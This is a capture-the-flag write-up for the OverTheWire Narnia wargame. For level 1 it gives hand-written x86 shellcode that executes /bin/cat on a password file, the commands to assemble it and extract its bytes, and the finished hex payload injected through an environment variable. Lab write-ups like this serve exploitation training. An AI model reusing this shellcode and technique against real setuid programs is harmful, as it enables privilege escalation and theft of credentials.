## Narnia Solutions

Here are short solutions I have written for Narnia levels. This is a wargame in overthewire.org. The main subject of the game is exploitation. I wrote only where I felt that there were not many sufficient solutions to the level.

### Narnia0

Well, I think that there are plany well written solutions for this level. I would like to mention, however, that the shellcode should be generated inside the shell (use python or ruby or perl, etc') because for some unusual reason, pasting a prepeared shellcode inside the shell **will not work**.


### Narnia1

To solve this level, we need to know assembly, x86 in this case (typing "lscpu" will reveal us the architecture and byte order, which are **important** for out shellcode). There are planty writeup's for this level, which most of them are incorrect (but I do recommand reading them in order to understand what is wrong), however. Moreover, I would advise you to learn how to write a shellcode in linux, because copying and pasting a shellcode from shell storm won't work in this case. So after we figure out that there is a buffer overflow with the enviromental variable, we want to inject our shellcode. Remeber, no null bytes and illegal chars!
Because spawning a regular shell won't work (the shell will be privileged with narnia1 user), we want to use the our vulnerability to open narnia2 password file. Let's dive into our shell code:
```
section .text
	global _start

_start:
	xor eax,eax
	push eax          ;end of the /bin/cat string
	push 0x7461632f
	push 0x6e69622f
	mov ebx, esp      ;ebx points to the start of the string
	push eax
	push 0x3261696e
	push 0x72616e2f
	push 0x73736170
	push 0x5f61696e
	push 0x72616e2f
	push 0x6374652f
	mov ecx, esp      ;ecx points to the start of the string (/etc/narnia_pass/narnia2)
  push eax          ;array has to end with null
	mov al, 11        ;we use execve syscall, numbered 11
	mov edx, esp      ;edx points to null (we don't need char *const envp[])
	push ecx          ;push the first arg (/etc/narnia_pass/narnia2)
	push ebx          ;push the second arg (/bin/cat
	mov ecx, esp      ;ecx points to array with two args
	int 0x80
```	
	
Now, we want to compile our code and link it, thus:
```nasm -f elf shell.asm -o shell.o
ld -m elf_i386 -s shell.o -o shell
```
(-m elf_i386 is not necessary, but was in my case)

Okay, let's extract our shellcode:
`for i in $(objdump -M intel -d shell | grep "^ "|cut -f2); do echo -n '\x'$i;done;echo`
and Wallah:
```
narnia1@narnia:~$ export EGG=`python -c "print('\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x69\x61\x32\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x50\xb0\x0b\x89\xe2\x51\x53\x89\xe1\xcd\x80')"`
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
